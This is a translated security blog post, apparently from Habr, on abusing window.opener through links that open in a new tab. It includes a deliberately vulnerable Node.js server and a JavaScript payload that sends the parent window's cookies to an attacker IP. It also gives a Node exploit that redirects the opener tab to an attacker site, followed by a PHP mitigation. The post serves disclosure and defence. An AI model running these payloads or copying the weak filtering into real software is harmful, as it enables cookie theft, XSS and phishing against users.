<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We attack via HTML tag a</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The a tag is not only valuable fur, but also the initialization of window.opener. 
 In this article, you will find a story about one particular featur...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We attack via HTML tag a</h1><div class="post__text post__text-html js-mediator-article">  The a tag is not only valuable fur, but also the initialization of window.opener. <br>  In this article, you will find a story about one particular feature of this tag and how to solve the problem. <br><br><a name="habracut"></a><br><br><h2>  Introduction </h2>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      It all started less than a year ago.  I noticed (found out) that opening a hyperlink in a new window initializes the JavaScript window.opener. <br><br>  <i>For reference: window.opener gives access to the parent window (to the parent frame), that is, to the window in which window.open () was called.</i> <br><br>  Of course, I immediately began to google, but did not find anything intelligible.  Everything would be fine, but if it were not for one ‚ÄúBUT‚Äù: <br>  Window.opener is initialized, even if the domains and / or IP addresses are different. <br><br>  The other day, I sort out the mail and see that I received a message from the Yandex team: <br><br><img src="https://habrastorage.org/storage2/188/f00/534/188f0053415f2028b61a7ec461e9f45b.png"><br><br>  The message about the bug, more precisely about the theoretical application of the attack through window.opener (further wo), was left by me about a month ago, I did not even hope for an answer. <br>  But the world is a strange thing, isn't it?  :) <br><br><h3>  Part 1 </h3><br><br><h2>  From theory to business! </h2><br>  Suppose we have a page into which we can embed a hyperlink. <br>  We will write code that allows us to reproduce this vulnerability. <br><br><pre><code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ‚Ññ1 /*      ,   .    node.js */ var http = require('http'); http.createServer(function (rq, rs) { var cookie="Super :"+Math.random(-1)*30/13+": Mario"; //   ,     rs.writeHead(200, {'Content-Type': 'text/html', 'Set-Cookie': cookie}); if(!require('url').parse(rq.url).query){ //      rs.end('&lt;h2&gt;ERROR!&lt;/h2&gt;&lt;br&gt;Example: http://127.0.0.1:8080/wo.bug?host=http://google.com/&lt;br&gt;Shutting down :)'); console.log('[DEBUG] URL: '+rq.url+' is not valid!'); //   console.log('Achtung!'); process.kill(process.pid); //  :) } var host=require('url').parse(rq.url, true).query.host, // host=host.replace(/ /g,'%20'),//     host=host.replace(/&lt;/g,'&amp;'+'lt;'), //antiXSS host=host.replace(/&gt;/g,'&amp;'+'gt;'), //antiXSS host=host.replace(/javascript:/g,''); //antiXSS console.log('URL: '+host); //    rs.end('&lt;center&gt;&lt;br&gt;&lt;a href='+host+' target="_blank"&gt;click-click&lt;/a&gt;&lt;br&gt;Hey, '+cookie+'! &lt;/center&gt;'); //""  }).listen(8080); //   8080 </span></span></code> </pre> <br><br>  In this code, the data protocol filtering is specifically omitted.  Through a specially crafted link, and by means of wo, we will be able to perform an XSS attack. <br>  For the tests, I took the ‚Äúbig three‚Äù browsers: Opera / 12.12, FireFox / 18.00, Chrome / 23.0.1271.97. <br><br><h3>  Firefox </h3><br>  So, let's transfer the value ‚Äúdata:, 1‚Äù to the href attribute of the tag: <br><br><img src="https://habrastorage.org/storage2/625/8a7/8cc/6258a78ccd805111b77d474a49cf72d1.png"><br><br>  After clicking on the hyperlink, we see that wo is initialized: <br><br><img src="https://habrastorage.org/storage2/661/590/e9e/661590e9e47934969d0ba935872c885e.png"><br><br>  This means that, perhaps, we have the opportunity to get full access to the parent window. <br>  It remains only to verify this. <br><br><img src="https://habrastorage.org/storage2/9ea/a95/9e5/9eaa959e567714c188034ef4125662f8.png"><br><br>  Using wo, we successfully accessed the parent window's cookies, but that‚Äôs why I don‚Äôt know document.cookie = window.opener.document.cookie, honestly.  I note that this feature is typical only for FF. <br><br>  Checked on a VM with XP SP3 and FF 17, the same picture: <br><br><img src="https://habrastorage.org/storage2/978/551/f4c/978551f4cf74e8f744d37c0fbb6c7812.png"><br><br>  It remains only to write exploit, which will use the tag "a", the data and wo protocol, to steal the cookies (and anything else at all). <br><br>  Payload: <br><br><pre> <code class="hljs pgsql">var snif=<span class="hljs-built_in"><span class="hljs-built_in">new</span></span> Image(), //  ck=<span class="hljs-keyword"><span class="hljs-keyword">window</span></span>.opener.document.cookie, //     concat = <span class="hljs-keyword"><span class="hljs-keyword">function</span></span>() { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>.prototype.<span class="hljs-keyword"><span class="hljs-keyword">slice</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">call</span></span>(arguments).<span class="hljs-keyword"><span class="hljs-keyword">join</span></span>("")};//     +,      <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span>   ,      JavaScript snif.src=concat(<span class="hljs-string"><span class="hljs-string">'http://192.168.1.4:8081/?cok='</span></span>,ck); //  (<span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span><span class="hljs-number"><span class="hljs-number">.4</span></span>- IP  )</code> </pre><br><br>  We transfer this to the host variable (using the data protocol, namely: data: text / html,). Click on the link and admire cookies: <br><img src="https://habrastorage.org/storage2/168/912/07c/16891207c3ef4c59871c94c1a7c4433d.png"><br><br>  And this is the window into which our code has been implemented: <br><br><img src="https://habrastorage.org/storage2/e1f/e71/504/e1fe71504d7dfcf7c77a4e989c4dce27.png"><br><br>  As you can see, we were able to successfully steal cookies. <br><br><h3>  Opera </h3><br>  Opera browser is almost the same as with FireFox.  So the steps will be the same. <br><br>  Check if wo is initialized: <br><br><img src="https://habrastorage.org/storage2/e68/771/6a3/e687716a31102af0466322ee070d33a3.png"><br><br>  Check if we can read cookies: <br><br><img src="https://habrastorage.org/storage2/c6e/28b/084/c6e28b084f11cb29e32570c2d00ca983.png"><br><br>  We see that we were able to successfully read cookies from the previous tab (the parent window). <br>  It remains only to exploit this vulnerability.  The payload code will be the same as for FF. <br><br>  We pass our exploit to the host variable and again we admire cookies: <br><br><img src="https://habrastorage.org/storage2/a89/8e8/c4b/a898e8c4ba4930e392dbc177d56ab3f3.png"><br><br>  Window with a link: <br><br><img src="https://habrastorage.org/storage2/1b6/e67/884/1b6e67884c15200a8bf01862e2cea095.png"><br><br>  So, we were able to successfully steal cookies.  Quite a sad situation, but Google Chrome still remains. <br><br><h3>  Chrome </h3><br>  Check access to wo: <br><br><img src="https://habrastorage.org/storage2/5dc/a0e/99b/5dca0e99b8755d05e41ca7d9987d085e.png"><br><br>  Wo is initialized, but Chrome does not allow us to access the data of the parent window: <br><br><img src="https://habrastorage.org/storage2/a02/db8/77a/a02db877ad193f603f8e897a26b72356.png"><br><br>  Now is the time to look at this vulnerability from a different angle. <br>  And what will happen if the data protocol is filtered? <br>  Let's add in our code the fourth filtering, filtering of the data protocol. <br><br>  The code will look like: <br><br><pre> <code class="hljs ruby">/*‚Ä¶*<span class="hljs-regexp"><span class="hljs-regexp">/ host=host.replace(/</span></span>&lt;<span class="hljs-regexp"><span class="hljs-regexp">/g,'&amp;'+'lt;'), /</span></span><span class="hljs-regexp"><span class="hljs-regexp">/antiXSS host=host.replace(/</span></span>&gt;<span class="hljs-regexp"><span class="hljs-regexp">/g,'&amp;'+'gt;'), /</span></span><span class="hljs-regexp"><span class="hljs-regexp">/antiXSS host=host.replace(/javascript</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/g</span></span>,<span class="hljs-string"><span class="hljs-string">''</span></span>), <span class="hljs-regexp"><span class="hljs-regexp">//anti</span></span>XSS host=host.replace(<span class="hljs-regexp"><span class="hljs-regexp">/data:/g</span></span>,<span class="hljs-string"><span class="hljs-string">''</span></span>); <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>Data  ! <span class="hljs-regexp"><span class="hljs-regexp">/*‚Ä¶*/</span></span></code> </pre><br><br>  Having made this amendment to the code, we will no longer be able to carry out an XSS attack, but we are able to mislead the user by redefining wo. <br><br><h3>  Part 2 </h3><br><br>  Now let's transfer, to the host variable, a link to the evil.com website. <br><br><h3>  Firefox </h3><br><img src="https://habrastorage.org/storage2/2d7/883/f46/2d7883f4636a1cb6e9b5abc824e0a911.png"><br><br>  In FF 18, the wo is successfully initialized, but we cannot penetrate into the previous frame (tab), since the domains are different and the security policy does not allow us to do this. <br><br><h3>  Opera </h3><br><img src="https://habrastorage.org/storage2/fe7/15c/291/fe715c291536a590b6f36c18991bef7e.png"><br><br>  The situation with this browser is similar to the situation with FireFox. <br><br><h3>  Chrome </h3><br><img src="https://habrastorage.org/storage2/123/815/51c/12381551c216ff8c38af8748d97d3184.png"><br><br>  In Chrome, access to the wo is available, but the security policy cuts our rights to a minimum. <br><br><img src="https://habrastorage.org/storage2/4d9/710/b19/4d9710b193362e6cc53ad35035e1ee58.png"><br><br><h2>  We attack! </h2><br><br><h3>  Firefox </h3><br><img src="https://habrastorage.org/storage2/72c/e92/283/72ce922838c34434987b7ec5344de02c.png"><br><br>  Override: <br><br><img src="https://habrastorage.org/storage2/953/f41/b08/953f41b08470b9e04b7faea49a88dc9e.png"><br><br><h3>  Opera </h3><br><img src="https://habrastorage.org/storage2/fc2/b5c/65c/fc2b5c65c4bf0c29c5fe0a2b792cfa27.png"><br><br>  Override wo: <br><br><img src="https://habrastorage.org/storage2/bd5/f76/23b/bd5f7623b76ea12c1ae68679d7a61e8e.png"><br><br><h3>  Chrome </h3><br><br><img src="https://habrastorage.org/storage2/56e/c44/e15/56ec44e15d007629a24a3c47b837f54b.png"><br><br>  Override: <br><br><img src="https://habrastorage.org/storage2/95a/f68/d06/95af68d06105d4dd744ba11ff1ac8e7d.png"><br><br><h3>  We write exploit </h3><br><br>  Well, if there is a vulnerability, then it should be exploit :) <br><br><pre> <code class="hljs lua">var http = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">'http'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!process.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>] || !process.argv[<span class="hljs-number"><span class="hljs-number">3</span></span>]){console.<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>(<span class="hljs-string"><span class="hljs-string">'Usage: node '</span></span>+process.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>]+<span class="hljs-string"><span class="hljs-string">' ip port'</span></span>);process.<span class="hljs-built_in"><span class="hljs-built_in">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>)} http.createServer(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(rq, rs)</span></span></span></span> { rs.writeHead(<span class="hljs-number"><span class="hljs-number">200</span></span>, {<span class="hljs-string"><span class="hljs-string">'Content-Type'</span></span>: <span class="hljs-string"><span class="hljs-string">'text/html'</span></span>}); // ,  <span class="hljs-number"><span class="hljs-number">200</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!rq.headers.referer){ //  Referer  rs.<span class="hljs-keyword"><span class="hljs-keyword">end</span></span>(<span class="hljs-string"><span class="hljs-string">''</span></span>); console.<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>(<span class="hljs-string"><span class="hljs-string">'Referer is undefined!'</span></span>); process.<span class="hljs-built_in"><span class="hljs-built_in">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>); } var host=<span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">'url'</span></span>).parse(rq.headers.referer).hostname; //    Referer<span class="hljs-string"><span class="hljs-string">' var out="&lt;html&gt;&lt;script&gt;"+ "window.opener.location='</span></span>http://<span class="hljs-string"><span class="hljs-string">"+process.argv[2]+"</span></span>:<span class="hljs-string"><span class="hljs-string">"+process.argv[3]+"</span></span>/<span class="hljs-string"><span class="hljs-string">"+host+"</span></span>.html<span class="hljs-string"><span class="hljs-string">';"+ //    "window.close()"+ //  "&lt;/script&gt;&lt;/html&gt;"; rs.end(out); //  console.log('</span></span>Window.opener changed!<span class="hljs-string"><span class="hljs-string">'); process.exit(1); }).listen(80) //   80 </span></span></code> </pre><br><br>  This simple code allows us to replace the site in the parent tab. <br>  I will make a reservation that the redirection will go to the address: <a href="http://site/">site</a> : port / referer.html.  Where "referer" is the meaning of the form site. * <br>  Due to the fact that taking screenshots will be problematic, I recorded a video: <br><br>  <a href="http://www.youtube.com/watch%3Fv%3DQ09GA9oOEs8">http://www.youtube.com/watch?v=Q09GA9oOEs8</a> <br><br><h2>  Protection </h2><br><br>  Well, we looked at examples of attacks, but how to defend? <br>  There are two ways to solve it: either forcefully change the value of the target attribute, tag a, to ‚Äú_self‚Äù, or dance with a tambourine, but open the link in a new window. Guess which way we go? <br><br>  The fix is ‚Äã‚Äãpretty simple: setting window.opener to null. <br>  Let's write a simple php code that allows you to redefine wo to null and redirect to the specified resource. <br><br><pre> <code class="hljs bash">&lt;?php <span class="hljs-variable"><span class="hljs-variable">$url</span></span>=str_replace(<span class="hljs-string"><span class="hljs-string">'data:'</span></span>,<span class="hljs-string"><span class="hljs-string">''</span></span>,<span class="hljs-variable"><span class="hljs-variable">$_GET</span></span>[<span class="hljs-string"><span class="hljs-string">'href'</span></span>]); // <span class="hljs-string"><span class="hljs-string">"data:"</span></span> <span class="hljs-variable"><span class="hljs-variable">$url</span></span>=htmlspecialchars(str_replace(<span class="hljs-string"><span class="hljs-string">'javascript:'</span></span>,<span class="hljs-string"><span class="hljs-string">''</span></span>,<span class="hljs-variable"><span class="hljs-variable">$url</span></span>)); //  XSS <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!<span class="hljs-variable"><span class="hljs-variable">$url</span></span>){die();}; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"&lt;html&gt;"</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"&lt;body&gt;"</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"&lt;script&gt;"</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"window.opener=null;"</span></span>; // wo  null <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"document.location='"</span></span>.<span class="hljs-variable"><span class="hljs-variable">$url</span></span>.<span class="hljs-string"><span class="hljs-string">"';"</span></span>; //  <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"&lt;/script&gt;"</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"&lt;/body&gt;"</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"&lt;/html&gt;"</span></span>; ?&gt;</code> </pre><br><br>  We can only apply the fix in our code (1). <br>  Suppose that our php file is stored at: <a href="http://site.com/file.php">site.com/file.php</a> <br>  Then our code (1) takes the form: <br><br><pre> <code class="hljs xml">/**/ rs.end('<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">center</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://site.com/file.php?href='+host+'"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_blank"</span></span></span><span class="hljs-tag">&gt;</span></span>click-click<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag">&gt;</span></span>Hey, '+cookie+'! <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">center</span></span></span><span class="hljs-tag">&gt;</span></span>'); /**/</code> </pre><br><br>  And here is the result of our "shamanism": <br><br><img src="https://habrastorage.org/storage2/254/e4d/cfc/254e4dcfca6ac68e84c54f2d1b0c03b9.png"><br><br>  Yes, this is an inconvenient way, but I can only offer such a solution at the moment. <br>  If you have ideas, please leave them in your comments. <br><br><h2>  Misadventure </h2><br><br>  Among the resources vulnerable to this attack, I can highlight <br>  Google: <br><br><img src="https://habrastorage.org/storage2/791/ac3/fe7/791ac3fe74f5f7a46ceea54ae39a9777.png"><br><br><hr><br><br><img src="https://habrastorage.org/storage2/148/977/db3/148977db30ddf44a54e04943c006486d.png"><br><br>  Rambler: <br><br><img src="https://habrastorage.org/storage2/530/f60/e1a/530f60e1ac262a1a3615c56a2800718f.png"><br><br><hr><br><br><img src="https://habrastorage.org/storage2/6ba/e1a/b67/6bae1ab6786e85a1e5ed497e5e10c1b1.png"><br><br>  The list can be continued indefinitely. <br><br>  And of course, this information is presented for reference only. <br>  You have no right to use it for attacks, otherwise the Criminal Code of the Russian Federation will punish you! <br>  Have a nice day! <br><br>  <b>UPD: We are</b> dealing with window.opener in IE 9 (sorry, only it was at hand) <br>  Something is going on with IE 9 ... <br>  For example, there is no data protocol in it. <br><br><img src="https://habrastorage.org/storage2/9f3/5b7/c69/9f35b7c6910fcdc94b476430e0dd4183.png"><br><br>  Therefore, we will try to redefine wo <br><br>  Click on the link and see that wo was successfully initialized: <br><br><img src="https://habrastorage.org/storage2/553/b44/48d/553b4448d9f3015b5cf8c008bf73df21.png"><br><br>  Trying to override wo: <br><br><img src="https://habrastorage.org/storage2/ab0/18a/b65/ab018ab657c4903cbb35a14b5ed0930c.png"><br><br>  Nothing, zero emotion. <br>  But if you open the previous tab, then: <br><br><img src="https://habrastorage.org/storage2/8d7/945/6db/8d79456dbec29f505b5e6ece3b529300.png"><br><br>  We see that IE recognizes the shift as opening a new window and issues a warning. <br><br>  And even this is not all! <br><br>  Resolve the popup window: <br><br><img src="https://habrastorage.org/storage2/07d/f6e/175/07df6e17512c233160063b13093efc09.png"><br><br>  Try again to change the location: <br><br><img src="https://habrastorage.org/storage2/54d/1f6/a3d/54d1f6a3d478623110b8e59b77e4630c.png"><br><br>  The substitution of window.opener not only did not happen, but in general a new window opened. <br><br>  <b>UPD2</b> : Youtube blocked video </div><p>Source: <a href="https://habr.com/ru/post/164539/">https://habr.com/ru/post/164539/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../164521/index.html">Leap years</a></li>
<li><a href="../164525/index.html">Has a solution and effectively solved, what is the difference?</a></li>
<li><a href="../164531/index.html">Acer and Asus stop netbook production</a></li>
<li><a href="../164533/index.html">jQuery from the inside - parsing html</a></li>
<li><a href="../164537/index.html">New Year's Google Doodles made 200 thousand visitors to the site with horoscopes</a></li>
<li><a href="../164543/index.html">We do data virtualization in LongListSelector</a></li>
<li><a href="../164547/index.html">ISS video tour from astronaut Sunita Williams (Russian translation)</a></li>
<li><a href="../164551/index.html">What are pirates? Hollywood set box office record</a></li>
<li><a href="../164557/index.html">Top 10 Algorithm Results for 2012</a></li>
<li><a href="../164559/index.html">Open webOS ported to Nexus 7</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>